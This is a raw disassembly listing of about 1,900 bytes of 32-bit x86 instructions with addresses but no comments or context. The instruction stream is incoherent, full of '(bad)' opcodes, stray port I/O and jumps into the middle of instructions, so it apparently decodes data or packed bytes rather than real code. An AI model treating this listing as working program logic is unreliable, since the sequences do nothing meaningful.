  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
  43124d:	mov    eax,0x824f89
  431252:	inc    edi
  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
